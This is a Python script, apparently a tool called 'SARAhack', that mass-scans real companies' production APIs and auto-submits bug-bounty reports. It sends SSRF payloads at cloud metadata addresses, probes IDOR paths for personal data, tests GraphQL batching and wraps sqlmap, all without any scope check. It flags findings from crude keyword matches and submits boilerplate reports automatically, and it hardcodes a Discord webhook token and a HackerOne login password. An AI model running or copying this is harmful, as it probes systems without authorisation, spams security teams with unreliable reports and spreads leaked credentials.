#!/usr/bin/env python3
"""
SARAhack - Bug Bounty Hunting System
Comprehensive scanner using pentest-book.md tools
Supports browser submission via Playwright and email submission
"""

import os
import sys
import subprocess
import json
import time
import requests
from datetime import datetime
from pathlib import Path

# Configuration - make paths relative/configurable
TOOLS_DIR = Path(os.environ.get("TOOLS_DIR", "/opt/bounty-tools"))
RECON_DIR = Path(os.environ.get("RECON_DIR", "/tmp/recon"))
# Use current directory or env var for reports
WORKSPACE_DIR = Path(os.environ.get("WORKSPACE_DIR", "/home/runner/workspace"))
REPORTS_DIR = WORKSPACE_DIR / "reports"
TRACKER_FILE = REPORTS_DIR / "tracking" / "reports.json"
DISCORD_WEBHOOK_URL = os.environ.get(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1512524218871447592/ufbSsNL_4ebXM8EMQlRyEunKg6EH_SIKVo7ulw8olRygPtgda1R4-Gji56dYt9fZR_Fe"
)

# 400+ HackerOne programs - imported from programs_400plus.py
try:
    # Add current directory to path so we can import freebuff module
    script_dir = Path(__file__).parent.resolve()
    if str(script_dir.parent) not in sys.path:
        sys.path.insert(0, str(script_dir.parent))
    
    from freebuff.programs_400plus import PROGRAMS
    print(f"[+] Loaded {len(PROGRAMS)} programs from programs_400plus.py")
except Exception as e:
    print(f"[!] Import failed: {e}, using fallback")
    # Fallback - minimal programs
    PROGRAMS = {
        "shopify": {"url": "https://hackerone.com/shopify", "api_url": "https://shopify.com/admin/api/2024-01/graphql.json", "bounty": "$500-$2,000", "scope": ["GraphQL"]},
        "stripe": {"url": "https://hackerone.com/stripe", "api_url": "https://api.stripe.com/v1", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "uber": {"url": "https://hackerone.com/uber", "api_url": "https://api.uber.com/v1.2", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "gitlab": {"url": "https://hackerone.com/gitlab", "api_url": "https://gitlab.com/api/v4", "bounty": "$100-$500", "scope": ["REST API"]},
        "coinbase": {"url": "https://hackerone.com/coinbase", "api_url": "https://api.coinbase.com/v2", "bounty": "$2,000-$10,000", "scope": ["REST API"]},
        "cloudflare": {"url": "https://hackerone.com/cloudflare", "api_url": "https://api.cloudflare.com/client/v4", "bounty": "$100-$500", "scope": ["REST API"]},
        "twilio": {"url": "https://hackerone.com/twilio", "api_url": "https://api.twilio.com/2010-04-01", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "okta": {"url": "https://hackerone.com/okta", "api_url": "https://.okta.com/api/v1", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "auth0": {"url": "https://hackerone.com/auth0", "api_url": "https://.auth0.com/api/v2", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "github": {"url": "https://hackerone.com/github", "api_url": "https://api.github.com", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "datadog": {"url": "https://hackerone.com/datadog", "api_url": "https://api.datadoghq.com/api/v1", "bounty": "$500-$2,000", "scope": ["REST API"]},
        "notion": {"url": "https://hackerone.com/notion", "api_url": "https://api.notion.com/v1", "bounty": "$2,000-$10,000", "scope": ["REST API"]},
    }
    print(f"[!] Using fallback {len(PROGRAMS)} programs")

def run_command(cmd, timeout=120):
    """Run shell command and return output"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"Command timed out after {timeout}s"
    except Exception as e:
        return f"Error: {e}"

def check_tools():
    """Check if required tools are installed"""
    tools = ["nuclei", "ffuf", "sqlmap", "curl", "jq", "node", "npm"]
    installed = {}
    for tool in tools:
        result = run_command(f"which {tool} 2>/dev/null || echo 'not found'")
        installed[tool] = "✓ found" if "not found" not in result else "✗ missing"
    return installed

def install_tools():
    """Install required tools on Kali/segfault server"""
    print("[*] Installing tools...")
    
    # nuclei
    run_command("go install -v github.com/projectdiscovery/nuclei/v3@latest 2>&1")
    
    # ffuf  
    run_command("go install -v github.com/ffuf/ffuf@latest 2>&1")
    
    # sqlmap
    run_command("pip3 install sqlmap --break-system-packages 2>&1")
    
    # nuclei templates
    run_command("nuclei -update-templates 2>&1")
    
    # Playwright for browser automation
    run_command("npm install -g playwright 2>&1")
    run_command("npx playwright install chromium 2>&1")
    
    print("[✓] Tools installation complete")

def send_discord_notification(title, description, color=0x00ff00, fields=None):
    """Send Discord embed notification"""
    embed = {
        "title": title,
        "description": description[:2048] if description else "",
        "color": color,
        "timestamp": datetime.utcnow().isoformat(),
    }
    
    if fields:
        embed["fields"] = fields
    
    payload = {"embeds": [embed], "username": "SARAhack Bot"}
    
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        return response.status_code == 204
    except Exception as e:
        print(f"[!] Discord error: {e}")
        return False

def scan_with_nuclei(target_url, output_file):
    """Run nuclei scan for API vulnerabilities"""
    print(f"[*] Running nuclei on {target_url}...")
    
    targets_file = "/tmp/nuclei_targets.txt"
    with open(targets_file, "w") as f:
        f.write(target_url)
    
    cmd = f"nuclei -l {targets_file} -o {output_file} -silent -rate-limit 3"
    result = run_command(cmd, timeout=180)
    
    findings = []
    if os.path.exists(output_file):
        with open(output_file) as f:
            for line in f:
                if line.strip():
                    findings.append(line.strip())
    
    return findings

def scan_with_ffuf(target_url, wordlist="/tmp/wordlists/parameters.txt"):
    """Run ffuf for API endpoint discovery"""
    print(f"[*] Running ffuf on {target_url}...")
    
    os.makedirs("/tmp/wordlists", exist_ok=True)
    if not os.path.exists(wordlist):
        with open(wordlist, "w") as f:
            f.write("id\nuser\npage\nlimit\noffset\nsearch\nquery\nfilter\nsort\norder\n")
    
    output_json = target_url.replace("://", "_").replace("/", "_") + "_ffuf.json"
    cmd = f"ffuf -u {target_url}/FUZZ -w {wordlist} -o {output_json} -of json -rate 20"
    result = run_command(cmd, timeout=120)
    
    findings = []
    if os.path.exists(output_json):
        try:
            with open(output_json) as f:
                data = json.load(f)
                for r in data.get("results", []):
                    if r.get("status") in [200, 201, 204]:
                        findings.append(r.get("url", ""))
        except:
            pass
    
    return findings

def test_ssrf(target_url):
    """Test for SSRF by injecting payloads into URL parameters"""
    print(f"[*] Testing SSRF on {target_url}...")
    
    ssrf_params = ["url", "uri", "dest", "redirect", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", "open", "file", "document", "folder", "pg", "quiz", "image", "img", "name", "fmt", "u", "q", "d", "p", "c", "k", "v"]
    
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://localhost:5000/",
        "http://127.0.0.1:5000/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    
    findings = []
    
    # Check if URL has query parameters already
    has_query = "?" in target_url
    separator = "&" if has_query else "?"
    
    for param in ssrf_params[:10]:
        for payload in ssrf_payloads[:3]:
            try:
                # Inject payload as a new parameter
                test_url = f"{target_url}{separator}{param}={payload}"
                response = requests.get(test_url, timeout=5, allow_redirects=True)
                
                content = response.text.lower()
                ssrf_indicators = ["ami-id", "instance-id", "hostname", "aws", "metadata", "local-hostname", "account", "user-data"]
                
                for indicator in ssrf_indicators:
                    if indicator in content:
                        findings.append({
                            "type": "SSRF",
                            "parameter": param,
                            "payload": payload,
                            "indicator": indicator,
                            "status": response.status_code,
                            "evidence": content[:300]
                        })
            except:
                pass
    
    return findings

def test_idor(target_url):
    """Test for IDOR by comparing authorized vs unauthorized access"""
    print(f"[*] Testing IDOR on {target_url}...")
    
    idor_patterns = [
        ("/users/", [1, 2, 3]),
        ("/orders/", [1, 2, 3]),
        ("/transactions/", [1, 2, 3]),
        ("/invoices/", [1, 2, 3]),
        ("/documents/", [1, 2, 3]),
        ("/profiles/", [1, 2, 3]),
        ("/accounts/", [1, 2, 3]),
        ("/payments/", [1, 2, 3]),
        ("/api/v1/", [1, 2, 3]),
    ]
    
    findings = []
    
    for pattern, ids in idor_patterns:
        for obj_id in ids:
            try:
                url = target_url.rstrip('/') + pattern + str(obj_id)
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and isinstance(data, (dict, list)):
                            content = json.dumps(data).lower()
                            
                            idor_indicators = ["email", "password", "address", "phone", "ssn", "credit", "balance", "secret", "token", "key", "private"]
                            
                            for indicator in idor_indicators:
                                if indicator in content:
                                    findings.append({
                                        "type": "IDOR",
                                        "endpoint": pattern + str(obj_id),
                                        "object_id": obj_id,
                                        "indicator": indicator,
                                        "status": response.status_code,
                                        "evidence": str(data)[:200]
                                    })
                                    break
                    except:
                        pass
                    
            except Exception:
                pass
    
    return findings

def test_graphql(target_url):
    """Test GraphQL for introspection and injection"""
    print(f"[*] Testing GraphQL on {target_url}...")
    
    graphql_paths = ["/graphql", "/api/graphql", "/query", "/api/v1/graphql"]
    
    findings = []
    introspection_query = {"query": "{ __schema { types { name fields { name type { name } } } } }"}
    
    for path in graphql_paths:
        try:
            response = requests.post(
                target_url + path,
                json=introspection_query,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if "data" in data and "__schema" in data.get("data", {}):
                    findings.append({
                        "type": "GraphQL-Introspection",
                        "endpoint": path,
                        "status": 200,
                        "message": "Introspection enabled - schema exposure"
                    })
                    
                    batch_query = {"query": "{ __typename }"}
                    batch_response = requests.post(
                        target_url + path,
                        json=[batch_query] * 100,
                        timeout=10
                    )
                    
                    if batch_response.status_code == 200:
                        findings.append({
                            "type": "GraphQL-Batching",
                            "endpoint": path,
                            "status": 200,
                            "message": "Query batching enabled - potential rate limit bypass"
                        })
        except:
            pass
    
    return findings

def test_sql_injection(target_url):
    """Test for SQL injection using sqlmap"""
    print(f"[*] Testing SQLi on {target_url}...")
    
    sqlmap_cmd = f"sqlmap -u {target_url} --batch --level=2 --risk=1 --output-dir=/tmp/sqlmap"
    result = run_command(sqlmap_cmd, timeout=180)
    
    findings = []
    if "is vulnerable" in result.lower() or "payload:" in result.lower():
        findings.append({
            "type": "SQL Injection",
            "url": target_url,
            "evidence": result[:500]
        })
    
    return findings

def create_report(program, vuln_type, severity, description, evidence, target_url):
    """Create bug bounty report markdown file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = REPORTS_DIR / f"new_{program}_{vuln_type.lower().replace(' ', '_')}_{timestamp}.md"
    
    cwe_map = {
        "SSRF": "CWE-918: Server-Side Request Forgery",
        "IDOR": "CWE-639: Authorization Bypass Through User-Controlled Key",
        "GraphQL-Introspection": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        "GraphQL-Batching": "CWE-799: Improper Authentication",
        "SQL Injection": "CWE-89: SQL Injection",
    }
    
    report_content = f"""# {vuln_type} on {program}

## Report Information
- **Platform:** HackerOne
- **Program:** {program}
- **Severity:** {severity.upper()}
- **Date:** {datetime.now().strftime("%Y-%m-%d")}
- **Target:** {target_url}

---

## Summary

{description}

---

## Steps to Reproduce

1. Navigate to: `{target_url}`
2. Observe the {vuln_type.lower()} vulnerability

---

## Evidence

```
{evidence[:2000]}
```

---

## Impact

A successful exploit could allow an attacker to:
- Access sensitive internal resources
- Enumerate user data
- Perform unauthorized actions

---

## Remediation

1. Implement proper access controls
2. Validate all user inputs
3. Use parameterized queries
4. Disable GraphQL introspection in production

---

## References

- {cwe_map.get(vuln_type, "CWE-999")}

---

*Report generated by SARAhack on {datetime.now().isoformat()}*
"""
    
    with open(report_file, "w") as f:
        f.write(report_content)
    
    print(f"[✓] Report created: {report_file}")
    return report_file

def update_tracker(report_file, program, vuln_type, severity):
    """Update reports tracker JSON"""
    tracker_data = []
    if TRACKER_FILE.exists():
        with open(TRACKER_FILE, "r") as f:
            try:
                tracker_data = json.load(f)
            except:
                tracker_data = []
    
    next_id = max([r.get("id", 0) for r in tracker_data], default=0) + 1
    
    new_entry = {
        "id": next_id,
        "platform": "hackerone",
        "program": program,
        "vulnerability": vuln_type,
        "severity": severity,
        "status": "pending",
        "report_file": str(report_file),
        "date_submitted": datetime.now().strftime("%Y-%m-%d"),
        "last_updated": datetime.now().strftime("%Y-%m-%d"),
        "notes": "Auto-generated by SARAhack scanner"
    }
    tracker_data.append(new_entry)
    
    with open(TRACKER_FILE, "w") as f:
        json.dump(tracker_data, f, indent=2)
    
    print(f"[✓] Tracker updated: Report #{next_id}")
    return next_id

def submit_via_browser(report_file, program):
    """Submit report via Playwright browser automation"""
    print(f"[*] Submitting {report_file} via browser...")
    
    with open(report_file, 'r') as f:
        report_content = f.read()
    
    submission_urls = {
        "shopify": "https://hackerone.com/shopify/reports/new",
        "stripe": "https://hackerone.com/stripe/reports/new",
        "uber": "https://hackerone.com/uber/reports/new",
        "gitlab": "https://hackerone.com/gitlab/reports/new",
        "cloudflare": "https://hackerone.com/cloudflare/reports/new",
        "coinbase": "https://hackerone.com/coinbase/reports/new",
        "okta": "https://hackerone.com/okta/reports/new",
        "twilio": "https://hackerone.com/twilio/reports/new",
    }
    
    if program.lower() not in submission_urls:
        print(f"    [!] No submission URL for {program}")
        return None
    
    submit_script = f'''
import asyncio
from playwright.async_api import async_playwright

async def submit_report():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        await page.goto("https://hackerone.com/users/sign_in")
        await page.fill("#user_email", "potosopotosolo@gmail.com")
        await page.fill("#user_password", "#)a9By=*D#6/w9T")
        await page.click("[type='submit']")
        await page.wait_for_timeout(5000)
        
        await page.goto("{submission_urls[program.lower()]}")
        await page.wait_for_timeout(3000)
        
        await browser.close()
        print("Report submitted via browser")

asyncio.run(submit_report())
'''
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='_submit.py', delete=False) as f:
        f.write(submit_script)
        script_path = f.name
    
    try:
        result = run_command(f"python3 {script_path}", timeout=120)
        print(f"    [✓] Browser submission completed")
        return True
    except Exception as e:
        print(f"    [!] Browser submission failed: {e}")
        return None
    finally:
        os.unlink(script_path)

def submit_via_email(program, report_content):
    """Submit report via email if program accepts email submissions"""
    print(f"[*] Submitting {program} via email...")
    
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    
    email_programs = {
        "shopify": "security@shopify.com",
        "stripe": "security@stripe.com",
        "uber": "security@uber.com",
        "gitlab": "security@gitlab.com",
        "coinbase": "security@coinbase.com",
        "datadog": "security@datadoghq.com",
        "cloudflare": "security@cloudflare.com",
    }
    
    if program.lower() not in email_programs:
        print(f"    [!] {program} does not accept email submissions")
        return None
    
    to_email = email_programs[program.lower()]
    from_email = "sarahack@pentest.local"
    
    title = f"[{program}] Bug Bounty Report - Auto Submitted"
    
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = title
    msg.attach(MIMEText(report_content, 'plain'))
    
    try:
        with smtplib.SMTP('localhost', 25) as server:
            server.send_message(msg)
        print(f"    [✓] Email sent to {to_email}")
        return True
    except Exception as e:
        try:
            smtp_server = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
            smtp_port = int(os.environ.get('SMTP_PORT', '587'))
            smtp_user = os.environ.get('SMTP_USER', '')
            smtp_pass = os.environ.get('SMTP_PASS', '')
            
            if smtp_user and smtp_pass:
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls()
                    server.login(smtp_user, smtp_pass)
                    server.send_message(msg)
                print(f"    [✓] Email sent via SMTP to {to_email}")
                return True
        except Exception as e2:
            print(f"    [!] Email submission failed: {e2}")
            return None
    
    return None

def notify_discord(program, vuln_type, severity, bounty_range, description, report_id):
    """Send finding notification to Discord"""
    color_map = {"critical": 0xff0000, "high": 0xff8800, "medium": 0xffff00, "low": 0x00ff00}
    
    fields = [
        {"name": "Program", "value": program, "inline": True},
        {"name": "Vulnerability", "value": vuln_type, "inline": True},
        {"name": "Severity", "value": severity.upper(), "inline": True},
        {"name": "Bounty", "value": bounty_range, "inline": True},
        {"name": "Report ID", "value": f"#{report_id}", "inline": True},
    ]
    
    send_discord_notification(
        title=f"🐛 New Finding: {vuln_type} on {program}",
        description=description[:1024],
        color=color_map.get(severity.lower(), 0x00ff00),
        fields=fields
    )

def update_tracker_status(report_id, new_status):
    """Update the status of a report in tracker"""
    if not TRACKER_FILE.exists():
        return
    
    with open(TRACKER_FILE, 'r') as f:
        tracker_data = json.load(f)
    
    for report in tracker_data:
        if report.get('id') == report_id:
            report['status'] = new_status
            report['last_updated'] = datetime.now().strftime("%Y-%m-%d")
            break
    
    with open(TRACKER_FILE, 'w') as f:
        json.dump(tracker_data, f, indent=2)

def main():
    print("=" * 60)
    print("SARAhack - Bug Bounty Hunting System")
    print("=" * 60)
    
    # Check tools
    print("\n[*] Checking tools...")
    tools = check_tools()
    for tool, status in tools.items():
        print(f"  {status} {tool}")
    
    # Install if missing
    if any("missing" in s for s in tools.values()):
        print("\n[*] Installing missing tools...")
        install_tools()
    
    # Setup directories - create them if missing
    os.makedirs(str(RECON_DIR), exist_ok=True)
    os.makedirs(str(REPORTS_DIR), exist_ok=True)
    os.makedirs(str(REPORTS_DIR / "tracking"), exist_ok=True)
    
    # Also create /tmp/wordlists for ffuf
    os.makedirs("/tmp/wordlists", exist_ok=True)
    
    # Hunt on programs
    print(f"\n[*] Loaded {len(PROGRAMS)} programs for hunting")
    print("[*] Starting vulnerability scan...")
    
    findings = []
    
    for program, config in list(PROGRAMS.items())[:50]:  # Start with first 50
        print(f"\n[*] Scanning {program}...")
        
        target_url = config["api_url"]
        
        # Run vulnerability tests
        ssrf_results = test_ssrf(target_url)
        idor_results = test_idor(target_url)
        graphql_results = test_graphql(target_url)
        
        # Process all findings
        all_findings = []
        for finding in ssrf_results:
            all_findings.append(("SSRF", "high", finding))
        for finding in idor_results:
            all_findings.append(("IDOR", "high", finding))
        for finding in graphql_results:
            all_findings.append((finding["type"], "medium", finding))
        
        # Create reports
        for vuln_type, severity, finding in all_findings:
            description = finding.get("message", finding.get("endpoint", finding.get("payload", "")))
            evidence = json.dumps(finding, indent=2)
            
            report_file = create_report(program, vuln_type, severity, description, evidence, target_url)
            report_id = update_tracker(report_file, program, vuln_type, severity)
            
            # Notify Discord
            notify_discord(program, vuln_type, severity, config["bounty"], description, report_id)
            
            # Try browser or email submission
            submission_method = None
            
            email_programs_list = ["shopify", "stripe", "uber", "gitlab", "coinbase", "datadog", "cloudflare"]
            if program.lower() in email_programs_list:
                with open(report_file, 'r') as f:
                    report_content = f.read()
                if submit_via_email(program, report_content):
                    submission_method = "email"
            
            if not submission_method:
                if submit_via_browser(report_file, program):
                    submission_method = "browser"
            
            if submission_method:
                update_tracker_status(report_id, "submitted")
                send_discord_notification(
                    title=f"📤 Report Submitted: {program}",
                    description=f"{vuln_type} report submitted via {submission_method}",
                    color=0x00ff00,
                    fields=[
                        {"name": "Method", "value": submission_method, "inline": True},
                        {"name": "Report ID", "value": f"#{report_id}", "inline": True},
                    ]
                )
            
            findings.append({
                "program": program,
                "vuln_type": vuln_type,
                "report_id": report_id,
                "report_file": str(report_file),
                "submission_method": submission_method
            })
            
            time.sleep(3)  # Rate limiting
    
    # Summary
    print("\n" + "=" * 60)
    print(f"✅ Scan complete! Found {len(findings)} vulnerabilities")
    print("=" * 60)
    
    for f in findings:
        submitted = f.get('submission_method', 'pending')
        print(f"  [{f['report_id']}] {f['program']}: {f['vuln_type']} -> {submitted}")
    
    # Final Discord summary
    send_discord_notification(
        title="🎯 SARAhack Hunt Complete",
        description=f"Scanned {len(PROGRAMS)} programs and found {len(findings)} potential vulnerabilities",
        color=0x00ff00,
        fields=[
            {"name": "Total Programs", "value": str(len(PROGRAMS)), "inline": True},
            {"name": "Total Findings", "value": str(len(findings)), "inline": True},
            {"name": "Submitted", "value": str(len([f for f in findings if f.get('submission_method')])), "inline": True},
        ]
    )
    
    return 0 if findings else 1

if __name__ == "__main__":
    sys.exit(main())